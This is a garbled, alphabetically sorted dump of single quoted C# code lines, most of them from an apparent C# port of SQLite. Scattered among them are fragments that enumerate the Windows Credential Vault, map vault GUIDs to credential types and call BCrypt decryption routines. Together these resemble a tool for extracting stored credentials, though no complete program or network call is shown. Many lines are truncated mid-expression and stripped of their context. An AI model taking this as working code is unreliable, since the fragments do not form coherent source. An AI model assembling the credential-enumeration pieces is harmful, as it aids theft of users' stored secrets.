"            sqlite3VdbeAddOp1( v, OP_MustBeInt, regRowid )"
"            sqlite3VdbeAddOp1( v, OP_NullRow, pLevel.iIdxCur )"
"            sqlite3VdbeAddOp1( v, OP_Yield, pDest.iParm )"
"            sqlite3VdbeAddOp1( v, to_op, inReg )"
"            sqlite3VdbeAddOp2( v, OP_AddImm, target, -1 )"
"            sqlite3VdbeAddOp2( v, OP_Close, iCur "
"            sqlite3VdbeAddOp2( v, OP_Close, tab1, 0 )"
"            sqlite3VdbeAddOp2( v, OP_Close, tab2, 0 )"
"            sqlite3VdbeAddOp2( v, OP_Count, iCsr, sAggInfo.aFunc[0].iMem )"
"            sqlite3VdbeAddOp2( v, OP_Gosub, pLevel.p1, pLevel.addrFirst )"
"            sqlite3VdbeAddOp2( v, OP_Goto, 0, pLevel.addrFirst )"
"            sqlite3VdbeAddOp2( v, OP_IdxInsert, iParm, r1 )"
"            sqlite3VdbeAddOp2( v, OP_IdxInsert, iParm, regRowid )"
"            sqlite3VdbeAddOp2( v, OP_IdxInsert, pDest.iParm, r1 )"
"            sqlite3VdbeAddOp2( v, OP_IdxInsert, sAggInfo.sortingIdx, regRecord )"
"            sqlite3VdbeAddOp2( v, OP_Integer, 1, iParm )"
"            sqlite3VdbeAddOp2( v, OP_Integer, 1, regRowid )"
"            sqlite3VdbeAddOp2( v, OP_Integer, 1, target )"
"            sqlite3VdbeAddOp2( v, OP_NewRowid, iParm, regRowid )"
"            sqlite3VdbeAddOp2( v, OP_NewRowid, pDest.iParm, r2 )"
"            sqlite3VdbeAddOp2( v, OP_Next, pIn.iCur, pIn.addrInTop )"
"            sqlite3VdbeAddOp2( v, OP_Next, sAggInfo.sortingIdx, addrTopOfLoop )"
"            sqlite3VdbeAddOp2( v, OP_Next, tab1, iStart )"
"            sqlite3VdbeAddOp2( v, OP_Null, 0, iData )"
"            sqlite3VdbeAddOp2( v, OP_Null, 0, iRegStore )"
"            sqlite3VdbeAddOp2( v, OP_Null, 0, regCols "
"            sqlite3VdbeAddOp2( v, OP_Null, 0, regData "
"            sqlite3VdbeAddOp2( v, OP_Null, 0, regRowset )"
"            sqlite3VdbeAddOp2( v, OP_Null, 0, target )"
"            sqlite3VdbeAddOp2( v, OP_ResultRow, pIn.iMem, pIn.nMem )"
"            sqlite3VdbeAddOp2( v, OP_Rewind, tab1, iBreak )"
"            sqlite3VdbeAddOp2( v, OP_RowData, iCur, iData )"
"            sqlite3VdbeAddOp2( v, OP_SCopy, iReg, target "
"            sqlite3VdbeAddOp2( v, OP_SCopy, r1, regBase "
"            sqlite3VdbeAddOp2( v, OP_SCopy, regData "
"            sqlite3VdbeAddOp2( v, OP_SCopy, regFromSelect "
"            sqlite3VdbeAddOp2( v, OP_SCopy, regRowid, regIdx "
"            sqlite3VdbeAddOp2( v, OP_Sequence, sAggInfo.sortingIdx, regBase "
"            sqlite3VdbeAddOp2( v, OP_Sort, sAggInfo.sortingIdx, addrEnd )"
"            sqlite3VdbeAddOp2( v, OP_Transaction, iDb, ( mask "
"            sqlite3VdbeAddOp2( v, op, r1, dest )"
"            sqlite3VdbeAddOp2( v, op, r1, inReg )"
"            sqlite3VdbeAddOp3( v, OP_And, r3, r4, target )"
"            sqlite3VdbeAddOp3( v, OP_Column, iCur, i, regData "
"            sqlite3VdbeAddOp3( v, OP_Column, srcTab, j, iRegStore )"
"            sqlite3VdbeAddOp3( v, OP_Column, srcTab, j, regCols "
"            sqlite3VdbeAddOp3( v, OP_Column, srcTab, keyColumn, regRowid )"
"            sqlite3VdbeAddOp3( v, OP_Column, srcTab, keyColumn, regTrigRowid )"
"            sqlite3VdbeAddOp3( v, OP_IdxDelete, iParm, regResult, nColumn )"
"            sqlite3VdbeAddOp3( v, OP_If, r1, dest, jumpIfNull != 0 "
"            sqlite3VdbeAddOp3( v, OP_IfNot, r1, dest, jumpIfNull != 0 "
"            sqlite3VdbeAddOp3( v, OP_Insert, iParm, regRow, regRowid )"
"            sqlite3VdbeAddOp3( v, OP_Insert, pDest.iParm, r1, r2 )"
"            sqlite3VdbeAddOp3( v, OP_Insert, pseudoTab, regRow, regRowid )"
"            sqlite3VdbeAddOp3( v, OP_MakeRecord, pIn.iMem, pIn.nMem, r1 )"
"            sqlite3VdbeAddOp3( v, OP_MakeRecord, regBase, nCol, regRecord )"
"            sqlite3VdbeAddOp3( v, OP_MakeRecord, regResult, nColumn, r1 )"
"            sqlite3VdbeAddOp3( v, OP_NotFound, tab2, iCont, r1 )"
"            sqlite3VdbeAddOp3( v, OP_OpenRead, iCsr, iRoot, iDb )"
"            sqlite3VdbeAddOp3( v, op, r2, r1, target )"
"            sqlite3VdbeAddOp4( v, OP_Blob, n / 2, target, 0, zBlob, P4_DYNAMIC )"
"            sqlite3VdbeAddOp4( v, OP_Function, constMask, r1, target,"
"            sqlite3VdbeAddOp4( v, OP_MakeRecord, pIn.iMem, 1, r1, p.affinity, 1 )"
"            sqlite3VdbeAddOp4( v, OP_MakeRecord, regRow, 1, regRowid, p.affinity, 1 )"
"            sqlite3VdbeAddOp4( v, OP_OpenEphemeral, pFunc.iDistinct, 0, 0,"
"            sqlite3VdbeAddOp4( v, OP_OpenWrite, iCur "
"            sqlite3VdbeAddOp4( v, OP_String8, 0, target, 0, pExpr.u.zToken, 0 )"
"            sqlite3VdbeChangeP2( v, addr, nCol )"
"            sqlite3VdbeChangeP4( v, addr, pKeyInfo, P4_KEYINFO )"
"            sqlite3VdbeChangeP4( v, sqlite3VdbeCurrentAddr( v ) - 1, n, P4_INT32 )"
"            sqlite3VdbeChangeP5( v, (u8)nFarg )"
"            sqlite3VdbeChangeP5( v, OPFLAG_APPEND )"
"            sqlite3VdbeChangeToNoop( v, addrSortingIdx, 1 )"
"            sqlite3VdbeJumpHere( v, addr )"
"            sqlite3VdbeJumpHere( v, j2 )"
"            sqlite3VdbeJumpHere( v, j5 )"
"            sqlite3VdbeJumpHere( v, pIn.addrInTop "
"            sqlite3VdbeJumpHere( v, pIn.addrInTop - 1 )"
"            sqlite3VdbeMemShallowCopy( c1, pMem1, MEM_Ephem )"
"            sqlite3VdbeMemShallowCopy( c2, pMem2, MEM_Ephem )"
"            sqlite3VdbePrintOp( null, i "
"            sqlite3VdbeResolveLabel( v, d2 )"
"            sqlite3VdbeResolveLabel( v, endLabel )"
"            sqlite3VdbeResolveLabel( v, iBreak )"
"            sqlite3VdbeResolveLabel( v, iCont )"
"            sqlite3VdbeSetChanges( db, 0 )"
"            sqlite3VdbeSetChanges( db, p.nChange )"
"            sqlite3VdbeSetColName( v, i, COLNAME_NAME, zCol, SQLITE_TRANSIENT )"
"            sqlite3VdbeSetColName( v, i, COLNAME_NAME, zName, SQLITE_DYNAMIC )"
"            sqlite3VdbeSetColName( v, i, COLNAME_NAME,"
"            sqlite3VdbeUsesBtree( v, iDb )"
"            sqlite3VtabBeginParse(pParse, yymsp[-3].minor.yy0, yymsp[-2].minor.yy0, yymsp[0].minor.yy0)"
"            sqlite3WalkExprList( pWalker, pList )"
"            sqlite3WalkSelect( pWalker, pFrom.pSelect )"
"            sqlite3_query_plan.Append( "" "" )"
"            sqlite3_query_plan.Append( ""{}"" )"
"            sqlite3_result_double( context, rVal )"
"            sqlite3_result_int( context, len )"
"            sqlite3_result_int( context, sqlite3_value_bytes( argv[0] ) )"
"            sqlite3_result_int64( context, iVal )"
"            sqlite3_result_text( context, ""NULL"", 4, SQLITE_STATIC )"
"            sqlite3_result_value( context, argv[0] )"
"            sqlite3_snprintf( nTemp, ref zTemp, ""%.16g"", pOp.p4.pReal )"
"            sqlite3_snprintf( nTemp, ref zTemp, ""%d"", pOp.p4.i )"
"            sqlite3_snprintf( nTemp, ref zTemp, ""%lld"", pOp.p4.pI64 )"
"            sqlite3_snprintf( nTemp, ref zTemp, ""%s(%d)"", pDef.zName, pDef.nArg )"
"            sqlite3_snprintf( nTemp, ref zTemp, ""collseq(%.20s)"", ( pColl != null "
"            sqlite3_snprintf( nTemp, ref zTemp, ""intarray"" )"
"            sqlite3_snprintf( nTemp, ref zTemp, ""keyinfo(%d"", pKeyInfo.nField )"
"            status = BCrypt.BCryptGetProperty(hAlg, name, value, value.Length, ref size, 0x0)"
"            status = BCrypt.BCryptSetAlgorithmProperty(hAlg, BCrypt.BCRYPT_CHAINING_MODE, chainMode, chainMode.Length, 0x0)"
"            string bufStr = (string)va_arg( ap, ""string"" )"
"            string info = """""
"            string v1, v2"
"            string zTemp = """""
"            string[] files = Directory.GetFiles(book_path, """
"            sz = cellSizePtr(pPage, data, pc)"
"            table = new DataTable( ""resultTable"" )"
"            testcase( delim == '""' )"
"            testcase( usedAsColumnCache( pParse, inReg, inReg ) != 0 )"
"            throw new Exception( ""Error with executing non-query: "
"            throw new Exception( ""Error with opening database "" "
"            tokenType = keywordCode( z, iOffset, i )"
"            transferJoinMarkings( pNew, pExpr )"
"            u32 newVal = (u32)va_arg( ap, ""u32"" )"
"            uint status = BCrypt.BCryptGetProperty(hAlg, name, null, 0, ref size, 0x0)"
"            uint status = BCrypt.BCryptImportKey(hAlg, IntPtr.Zero, BCrypt.BCRYPT_KEY_DATA_BLOB, out hKey, keyDataBuffer, keyDataSize, keyBlob, keyBlob.Length, 0x0)"
"            uint status = BCrypt.BCryptOpenAlgorithmProvider(out hAlg, alg, provider, 0x0)"
"            updateAccumulator( pParse, sAggInfo )"
"            v.pExpr = sqlite3PExpr(pParse, TK_UMINUS, yymsp[0].minor.yy346.pExpr, 0, 0)"
"            v1 = sqlite3ValueText( (sqlite3_value)c1, pColl.enc )"
"            v2 = sqlite3ValueText( (sqlite3_value)c2, pColl.enc )"
"            var authInfo = new BCrypt.BCRYPT_AUTHENTICATED_CIPHER_MODE_INFO(iv, aad, authTag)"
"            var pattern = new System.Text.RegularExpressions.Regex("""
"            var result = VaultCli.VaultEnumerateVaults(0, ref vaultCount, ref vaultGuidPtr)"
"            vaultSchema.Add(new Guid(""00000000-0000-0000-0000-000000000000""), null)"
"            vaultSchema.Add(new Guid(""154E23D0-C644-4E6F-8CE6-5069272F999F""), ""Windows Credential Picker Protector"")"
"            vaultSchema.Add(new Guid(""2F1A6504-0641-44CF-8BB5-3612D865F2E5""), ""Windows Secure Note"")"
"            vaultSchema.Add(new Guid(""3C886FF3-2669-4AA2-A8FB-3F6759A77548""), ""Windows Extended Credential"")"
"            vaultSchema.Add(new Guid(""3CCD5499-87A8-4B10-A215-608888DD3B55""), ""Windows Web Password Credential"")"
"            vaultSchema.Add(new Guid(""3E0E35BE-1B77-43E7-B873-AED901B6275B""), ""Windows Domain Password Credential"")"
"            vaultSchema.Add(new Guid(""4BF4C442-9B8A-41A0-B380-DD4A704DDB28""), ""Web Credentials"")"
"            vaultSchema.Add(new Guid(""77BC582B-F0A6-4E15-4E80-61736B6F3B29""), ""Windows Credentials"")"
"            vaultSchema.Add(new Guid(""E69D7838-91B5-4FC9-89D5-230D4D4CC2BC""), ""Windows Domain Certificate Credential"")"
"            whereClauseInit( pAndWC, pWC.pParse, pMaskSet )"
"            whereSplit( pAndWC, pOrTerm.pExpr, TK_AND )"
"            x.y IN ('hi','hoo','hum')"
"            xBenignBegin = (void_function)va_arg( ap, ""void_function"" )"
"            xBenignEnd = (void_function)va_arg( ap, ""void_function"" )"
"            yy_syntax_error(yypParser, yymajor, yyminorunion)"
"            yygotominor.yy0.z = yymsp[-2].minor.yy0.z.Substring(0, yygotominor.yy0.n)"
"            yygotominor.yy0.z = yymsp[-3].minor.yy0.z.Substring(0, yygotominor.yy0.n)"
"            yygotominor.yy0.z = yymsp[-5].minor.yy0.z.Substring(0, yygotominor.yy0.n)"
"            yygotominor.yy14 = sqlite3ExprListAppend(pParse, 0, p)"
"            yygotominor.yy14 = sqlite3ExprListAppend(pParse, 0, yymsp[-1].minor.yy132)"
"            yygotominor.yy14 = sqlite3ExprListAppend(pParse, 0, yymsp[-2].minor.yy346.pExpr)"
"            yygotominor.yy14 = sqlite3ExprListAppend(pParse, 0, yymsp[0].minor.yy346.pExpr)"
"            yygotominor.yy14 = sqlite3ExprListAppend(pParse, yygotominor.yy14, yymsp[0].minor.yy346.pExpr)"
"            yygotominor.yy14 = sqlite3ExprListAppend(pParse, yymsp[-1].minor.yy14, p)"
"            yygotominor.yy14 = sqlite3ExprListAppend(pParse, yymsp[-2].minor.yy14, yymsp[-1].minor.yy346.pExpr)"
"            yygotominor.yy14 = sqlite3ExprListAppend(pParse, yymsp[-3].minor.yy14, pDot)"
"            yygotominor.yy14 = sqlite3ExprListAppend(pParse, yymsp[-3].minor.yy14, yymsp[-1].minor.yy132)"
"            yygotominor.yy14 = sqlite3ExprListAppend(pParse, yymsp[-4].minor.yy14, p)"
"            yygotominor.yy14 = sqlite3ExprListAppend(pParse, yymsp[-4].minor.yy14, yymsp[-2].minor.yy346.pExpr)"
"            yygotominor.yy14 = sqlite3ExprListAppend(pParse, yymsp[-4].minor.yy14, yymsp[0].minor.yy346.pExpr)"
"            yygotominor.yy3 = sqlite3SelectNew(pParse, yymsp[-6].minor.yy14, yymsp[-5].minor.yy65, yymsp[-4].minor.yy132, yymsp[-3].minor.yy14, yymsp[-2].minor.yy132, yymsp[-1].minor.yy14, yymsp[-7].minor.yy328, yymsp[0].minor.yy476.pLimit, yymsp[0].minor.yy476.pOffset)"
"            yygotominor.yy346.pExpr = sqlite3ExprFunction(pParse, 0, yymsp[-3].minor.yy0)"
"            yygotominor.yy346.pExpr = sqlite3ExprFunction(pParse, 0, yymsp[0].minor.yy0)"
"            yygotominor.yy346.pExpr = sqlite3ExprFunction(pParse, pList, yymsp[-2].minor.yy96.eOperator)"
"            yygotominor.yy346.pExpr = sqlite3ExprFunction(pParse, yymsp[-1].minor.yy14, yymsp[-4].minor.yy0)"
"            yygotominor.yy346.pExpr = sqlite3ExprSetColl(pParse, yymsp[-2].minor.yy346.pExpr, yymsp[0].minor.yy0)"
"            yygotominor.yy346.pExpr = sqlite3PExpr(pParse, TK_BETWEEN, yymsp[-4].minor.yy346.pExpr, 0, 0)"
"            yygotominor.yy346.pExpr = sqlite3PExpr(pParse, TK_CASE, yymsp[-3].minor.yy132, yymsp[-1].minor.yy132, 0)"
"            yygotominor.yy346.pExpr = sqlite3PExpr(pParse, TK_CAST, yymsp[-3].minor.yy346.pExpr, 0, yymsp[-1].minor.yy0)"
"            yygotominor.yy346.pExpr = sqlite3PExpr(pParse, TK_DOT, temp1, temp2, 0)"
"            yygotominor.yy346.pExpr = sqlite3PExpr(pParse, TK_DOT, temp1, temp4, 0)"
"            yygotominor.yy346.pExpr = sqlite3PExpr(pParse, TK_IN, yymsp[-3].minor.yy346.pExpr, 0, 0)"
"            yygotominor.yy346.pExpr = sqlite3PExpr(pParse, TK_IN, yymsp[-4].minor.yy346.pExpr, 0, 0)"
"            yygotominor.yy346.pExpr = sqlite3PExpr(pParse, TK_RAISE, 0, 0, 0)"
"            yygotominor.yy346.pExpr = sqlite3PExpr(pParse, TK_RAISE, 0, 0, yymsp[-1].minor.yy0)"
"            yygotominor.yy346.pExpr = sqlite3PExpr(pParse, TK_SELECT, 0, 0, 0)"
"            yygotominor.yy65 = sqlite3SrcListAppendFromTerm(pParse, yymsp[-6].minor.yy65, 0, 0, yymsp[-2].minor.yy0, yymsp[-4].minor.yy3, yymsp[-1].minor.yy132, yymsp[0].minor.yy408)"
"            yygotominor.yy65 = sqlite3SrcListAppendFromTerm(pParse, yymsp[-6].minor.yy65, yymsp[-5].minor.yy0, yymsp[-4].minor.yy0, yymsp[-3].minor.yy0, 0, yymsp[-1].minor.yy132, yymsp[0].minor.yy408)"
"            yymsp[-10].minor.yy0, yymsp[0].minor.yy0, SQLITE_SO_ASC, yymsp[-7].minor.yy328)"
"            z = z.Remove( 0, n )"
"            zBlob = sqlite3HexToBlob( sqlite3VdbeDb( v ), z, n )"
"            zCol = ""rowid"""
"            zMsg = sqlite3MAppendf( db, zMsg, ""%s AS %s"", zMsg, pItem.zAlias )"
"            zMsg = sqlite3MAppendf( db, zMsg, ""%s ORDER BY"", zMsg )"
"            zMsg = sqlite3MAppendf( db, zMsg, ""%s USING PRIMARY KEY"", zMsg )"
"            zMsg = sqlite3MAppendf( db, zMsg, ""%s VIA MULTI-INDEX UNION"", zMsg )"
"            zMsg = sqlite3MAppendf( db, zMsg, ""%s WITH INDEX %s"","
"            zMsg, pLevel.plan.u.pIdx.zName )"
"            zName = sqlite3MPrintf( db, ""%s"", pColExpr.u.zToken )"
"            zName = sqlite3MPrintf( db, ""%s"", pEList.a[i].zSpan )"
"            zName = sqlite3MPrintf( db, ""%s"","
"            zName = sqlite3MPrintf( db, ""%s.%s"", pTab.zName, zCol )"
"            zNewName = sqlite3MPrintf( db, ""%s:%d"", zName.Substring( 0, nName ), "
"            zSep = "","""
"            zTemp.Append( "")"" )"
"            zText.Append( ""X'"" )"
"            zToken = p.u.zToken.Substring( 0, nToken )"
"            zType = columnType( sNC, p, ref zOriginDb, ref zOriginTab, ref zOriginCol )"
"           //sqlite3DbMallocZero(db,"
"           PCache1.nMax, or"
"           SQLITE_UTF8, SQLITE_STATIC )"
"           UInt32 BufferLengthInBytes,"
"           [MarshalAs(UnmanagedType.Bool)]bool DisableAllPrivileges,"
"           aRegIdx, chngRowid, true,"
"           onError, addr, ref iDummy )"
"           one of the special names ""old"" or ""new""."
"           purgeable caches,"
"           ref TOKEN_PRIVILEGES NewState,"
"           ref TOKEN_PRIVILEGES PreviousState,"
"           the sum of nMax for all purgeable caches, less the sum of "
"          "" should reference only one column of table %T"","
"          ""%d of %d pages missing from overflow list starting at %d"","
"          ""%s %T cannot reference objects in database %s"","
"          ""CREATE %s %."
"          ""DELETE FROM %Q.sqlite_stat1 WHERE idx=%Q"","
"          ""DELETE FROM %Q.sqlite_stat1 WHERE tbl=%Q"", pDb.zName, pTab.zName"
"          ""DELETE FROM %s.sqlite_sequence WHERE name=%Q"","
"          ""ESCAPE expression must be a single character"", -1 )"
"          ""Fragmentation of %d bytes reported as %d on page %d"","
"          ""attached databases must use the same text encoding as main database"" )"
"          ""automatic extension loading failed: %s"", zErrmsg )"
"          ""clauses in the same join"" )"
"          ""column in the result set"", i "
"          ""file for storing temporary tables"" )"
"          ""from within a transaction"" )"
"          ""malformed database schema (%s)"", zObj )"
"          ""unable to close due to unfinished backup operation"" )"
"          ""unable to delete/modify collation sequence due to active statements"" )"
"          ""unable to delete/modify user-function due to active statements"" )"
"          ( nConstraint ), P4_INT32 )"
"          //  //sqlite3DbFree( db, ref pEnd.zMalloc )"
"          //  memcpy(pKeyInfo.aSortOrder, aSortOrder, nField)"
"          //  pNew =  sqlite3GlobalConfig.m.xRealloc(pOld, nNew)"
"          //  v.zErrMsg = """""
"          // Don't Clone Checks, only copy reference via Memberwise Clone above --"
"          // Don't Clone Schema, only copy reference via Memberwise Clone above --"
"          // Don't Clone pNextZombie, only copy reference via Memberwise Clone above --"
"          //TESTONLY( rc = ) sqlite3BitvecSet(pPager.pInJournal, pgno)"
"          //TESTONLY( rc2  = ) sqlite3BtreeCommitPhaseOne(p.pSrc, 0)"
"          //apCell[nCell] = findOverflowCell( pOld, j )"
"          //memcpy( z, pToCol.a[i].zName, n )"
"          //memcpy(newCell, oldCell, 4)"
"          //memcpy(pColl[0].zName, zName, nName)"
"          //memcpy(pKeyInfo, zP4, nByte)"
"          //pNew =  sqlite3GlobalConfig.m.xRealloc(pOld, nNew)"
"          //pOp = sqlite3VdbeGetOp( v, pWInfo.iTop )"
"          //pVdbeFunc = (VdbeFunc)sqlite3DbRealloc( pCtx.s.db, pVdbeFunc, nMalloc )"
"          //sqlite3DbFree( db, pCol.zDflt )"
"          //sqlite3DbFree( db, pLevel.u._in.aInLoop )"
"          //sqlite3DbFree( db, ref p.u.zToken )"
"          //sqlite3DbFree( db, ref p.zErrMsg )"
"          //sqlite3DbFree( db, ref pCol.zColl )"
"          //sqlite3DbFree( db, ref pCol.zDflt )"
"          //sqlite3DbFree( db, ref pCol.zName )"
"          //sqlite3DbFree( db, ref pCol.zType )"
"          //sqlite3DbFree( db, ref pDb.zName )"
"          //sqlite3DbFree( db, ref pItem.zName )"
"          //sqlite3DbFree( db, ref pItem.zSpan )"
"          //sqlite3DbFree( db, ref pOp.zComment )"
"          //sqlite3DbFree( db, ref v.zErrMsg )"
"          //sqlite3DbFree( db, ref z )"
"          //sqlite3DbFree( db, ref zColl )"
"          //sqlite3DbFree( db, ref zMaster )"
"          //sqlite3DbFree( db, ref zSqlCopy )"
"          //sqlite3DbFree( db, zErrDyn )"
"          //sqlite3DbFree( pParse.db, zName )"
"          //sqlite3DbFree(db,ref zMaster)"
"          //sqlite3DbStrNDup( db, pSpan.zStart,"
"          //sqlite3StackFree( null, aiValues )"
"          //sqlite3StackFree( pErrorDb, pParse )"
"          //sqlite3StatusAdd(SQLITE_STATUS_SCRATCH_USED, 1)"
"          //sqlite3StatusSet(SQLITE_STATUS_SCRATCH_SIZE, n)"
"          //sqlite3VdbeAddOp4( v, OP_Int64, 0, iMem, 0, zV, P4_INT64 )"
"          //szCell[nCell] = cellSizePtr( pOld, apCell, nCell )"
"          //zName = sqlite3DbStrDup(db, zName)"
"          //zV = dup8bytes( v, (char"
"          //zV = dup8bytes(v,  value)"
"          0 == sqlite3StrICmp( pDb.zName, zName ) )"
"          0, pKeyInfo, P4_KEYINFO_HANDOFF )"
"          Array.Clear( buf, offset "
"          Bitmask m = getMask( pMaskSet, pTabList.a[i].iCursor )"
"          Buffer.BlockCopy( aData, 0, cp.aData, 0, aData.Length )"
"          Buffer.BlockCopy( p.u.aHash, 0, aiValues, 0, aiValues.Length "
"          Buffer.BlockCopy( pCell, 0, cp.pCell, 0, pCell.Length )"
"          Buffer.BlockCopy( pData, 24, pPager.dbFileVers, 0, pPager.dbFileVers.Length )"
"          Buffer.BlockCopy( zSrcData, (int)( iOff % nSrcPgsz ), zDestData, (int)( iOff % nDestPgsz ), nCopy )"
"          Buffer.BlockCopy(pCell, nSkip, pTemp, nSkip, sz - nSkip)"
"          Buffer.BlockCopy(pParent.aData, apDiv[i], pTemp, 0, sz)"
"          Buffer.BlockCopy(pSrc, pSrcIndex, pPayload, pPayloadIndex, n)"
"          Buffer.BlockCopy(pTemp, leafCorrection, apCell[nCell], 0, sz)"
"          Buffer.BlockCopy(pZeroBlob, 0, pPayload, pPayloadIndex, n)"
"          CLEARBIT( pV, ( i "
"          CODEC2( pPager, pList.pData, pgno, 6, SQLITE_NOMEM, ref pData )"
"          CollSeq pReq = sqlite3BinaryCompareCollSeq( pParse, pX.pLeft, pExpr )"
"          CollSeq[] aColl = (CollSeq[])sqlite3HashFind( db.aCollSeq, zName, nName )"
"          DbSetProperty( db, 1, DB_SchemaLoaded )"
"          Debug.Assert( !ExprHasProperty( pE, EP_xIsSelect ) )"
"          Debug.Assert( !ExprHasProperty( sAggInfo.aFunc[i].pExpr, EP_xIsSelect ) )"
"          Debug.Assert( """" == ""Invalid flags argument"" )"
"          Expr pE, pDup"
"          IOTRACE( ""LOCK %p %d"
"          IOTRACE( ""PGOUT %p %d"
"          IOTRACE( ""ZERO %p %d"
"          Jump AltB, AeqB, AgtB"
"          KeyInfo pKey = sqlite3IndexKeyinfo( pParse, pIx )"
"          ManagementObjectSearcher mosDiskDrives = new ManagementObjectSearcher( ""select "
"          OSTRACE2( ""error-code = %d"
"          PAGERID( pPager ), pgno, pager_pagehash( pList ) )"
"          PAGERTRACE( ""NOSTORE %d page %d"
"          PAGERTRACE( ""STORE %d page %d hash(%08x)"
"          Pgno childPgno = sqlite3Get4byte(pPage.aData, pCell)"
"          Pgno pgnoOvfl = sqlite3Get4byte(pCell, iCell, info.iOverflow)"
"          SETBIT( pV, ( i "
"          SQLITE_SKIP_UTF8( zBytes, ref iz )"
"          SWAP( ref pRangeEnd, ref pRangeStart )"
"          Select pLoop, pRight = null"
"          TRACE(""ALLOCATE: %d from end of file (pointer-map page)"
"          TRACE(""FREE-PAGE: %d leaf on trunk page %d"
"          VdbeComment( v, ""%s"", pIx.zName )"
"          VdbeComment( v, ""Groupby result generator entry point"" )"
"          VdbeComment( v, ""LIMIT"
"          VdbeComment( v, ""OFFSET counter"" )"
"          VdbeComment( v, ""check abort flag"" )"
"          VdbeComment( v, ""clear abort flag"" )"
"          VdbeComment( v, ""end groupby result generator"" )"
"          VdbeComment( v, ""indicate accumulator empty"" )"
"          VdbeComment( v, ""indicate data in accumulator"" )"
"          VdbeComment( v, ""output final row"" )"
"          VdbeComment( v, ""output one row"" )"
"          VdbeComment( v, ""pk"" )"
"          VdbeComment( v, ""reset accumulator"" )"
"          VdbeComment( v, ""set abort flag"" )"
"          WHERETRACE( ""... multi-index OR cost=%.9g nrow=%.9g"
"          WHERETRACE( ""... rowid IN cost: %.9g"
"          WHERETRACE( ""... rowid range reduces cost to %.9g"
"          [prepared statement] S indicated an error, then"
"          [prepared statement] S returned [SQLITE_ROW] or [SQLITE_DONE],"
"          [sqlite3_enable_load_extension()] prior to calling this API,"
"          a.CopyTo( cp.a, 0 )"
"          a[i] = pcacheMergeDirtyList( a[i], p )"
"          addr = sqlite3VdbeAddOp1( v, OP_IfPos, pLevel.iLeftJoin )"
"          addr = sqlite3VdbeAddOp2( v, OP_IfPos, 2, 0 )"
"          addr = sqlite3VdbeAddOpList( v, getCacheSize.Length, getCacheSize )"
"          addr1 = sqlite3VdbeAddOp1( v, OP_IfPos, iLimit )"
"          addr1 = sqlite3VdbeAddOp1( v, OP_IfPos, iOffset )"
"          addrIf = sqlite3VdbeAddOp1( v, OP_If, regEof )"
"          addrSortingIdx = sqlite3VdbeAddOp4( v, OP_OpenEphemeral,"
"          addrTop = sqlite3VdbeAddOp1( v, OP_Yield, dest.iParm )"
"          analyzeDatabase( pParse, i )"
"          analyzeDatabase( pParse, iDb )"
"          apColl = multiSelectCollSeq( pParse, p, i )"
"          apDiv[i] = findCell(pParent, i "
"          b = getMask( pMaskSet, pOrTerm.leftCursor )"
"          c = sqlite3Utf8Read( zString, ref zString )"
"          c2 = sqlite3Utf8Read( zPattern, ref zPattern )"
"          c2 = sqlite3Utf8Read( zString, ref zString )"
"          cacheEntryClear( pParse, p )"
"          case '""':     /"
"          checkAppendMsg(pCheck, null,"
"          checkAppendMsg(pCheck, zContext, ""failed to get page %d"", iPage)"
"          checkAppendMsg(pCheck, zContext,"
"          checkAppendMsg(sCheck, null, ""Page %d is never used"", i)"
"          checkAppendMsg(sCheck, null, ""Pointer map page %d is referenced"", i)"
"          checkList(pCheck, 0, (int)pgnoOvfl, nPage, zContext)"
"          checkPtrmap(pCheck, (u32)pgno, PTRMAP_BTREE, (u32)iPage, """")"
"          checkPtrmap(sCheck, (u32)aRoot[i], PTRMAP_ROOTPAGE, 0, """")"
"          chldPg = sqlite3Get4byte(pPage.aData, findCell(pPage, lwr))"
"          chldPg = sqlite3Get4byte(pPage.aData, pPage.hdrOffset "
"          cnt, data[hdr "
"          codeApplyAffinity( pParse, regBase, nEq "
"          codeDistinct( pParse, pF.iDistinct, addrNext, 1, regAgg )"
"          codeOffset( v, p, iContinue )"
"          codeReal( v, z, negFlag, iMem )"
"          codeTriggerProgram( pParse, p.step_list, orconf )"
"          corruptSchema( pData, argv[0], ""invalid rootpage"" )"
"          d2 = checkTreePage(pCheck, pgno, zContext)"
"          db.aDb[iDb].zName, pIndex.zName"
"          db.pDfltColl = sqlite3FindCollSeq( db, SQLITE_UTF8, ""BINARY"", 0 )"
"          defaults to ""sqlite3_extension_init""."
"          destroyRootPage( pParse, iLargest, iDb )"
"          destroyTable( pParse, pTab )"
"          disableTerm( pLevel, pEnd )"
"          disableTerm( pLevel, pStart )"
"          disableTerm( pLevel, pTerm )"
"          distinct, pDest,"
"          double r1, r2"
"          dropCell(pParent, i "
"          else if ( !ExprHasProperty( ( pExpr = pTerm.pExpr ), EP_xIsSelect )"
"          else if ( ( pPage = pager_lookup( pPager, pg ) ) != null )"
"          exprAnalyze( pSrc, pWC, idxNew )"
"          exprCommute( pParse, pDup )"
"          finalizeAggFunctions( pParse, sAggInfo )"
"          first argument to ""func"".  Use it for whatever you like."
"          for ( i = 1, pIdx = pTab.pIndex "
"          for ( iDb = 0, mask = 1 "
"          fprintf(yyTraceFILE, "" %s"", yyTokenName[yypParser.yystack[i].major])"
"          freeP4( db, n, _p4 )"
"          freeP4( db, pOp.p4type, pOp.p4.p )"
"          freeP4( db, pOp.p4type, pOp.p4type == P4_VDBEFUNC "
"          freePage(pPage, ref rc)"
"          getTempname( 256, zTmpname )"
"          h = strHash( pKey, nKey ) % pH.htsize"
"          heightOfExpr( p.a[i].pExpr, ref pnHeight )"
"          iAddr = sqlite3VdbeAddOp1( v, OP_If, iMem )"
"          iRetInit = sqlite3VdbeAddOp2( v, OP_Integer, 0, regReturn )"
"          idxNew = whereClauseInsert( pWC, pNewExpr, TERM_VIRTUAL "
"          if ( !ExprHasProperty( p, EP_IntValue ) "
"          if ( !sqlite3ExprCompare( pExprA, pExprB ) ) return false"
"          if ( ( pTab = isSimpleCount( p, sAggInfo ) ) != null )"
"          if ( ExprHasAnyProperty( pNew, EP_Reduced "
"          if ( a != null ) a.CopyTo( cp.a, 0 )"
"          if ( ap[vaNEXT - 1].GetType().BaseType.Name == ""Object"" ) return (i64)( ap[vaNEXT - 1].GetHashCode() )"
"          if ( ap[vaNEXT - 1].GetType().Name == ""Int32"" "
"          if ( fileExists( db, ""vdbe_sqltrace"" ) != 0 )"
"          if ( findTerm( pWC, iCur, -1, notReady, WO_GT "
"          if ( findTerm( pWC, iCur, -1, notReady, WO_LT "
"          if ( isOuter ) setJoinExpr( pRight.pOn, pRight.iCursor )"
"          if ( memcmp( pE.u.zToken, z, n ) == 0 "
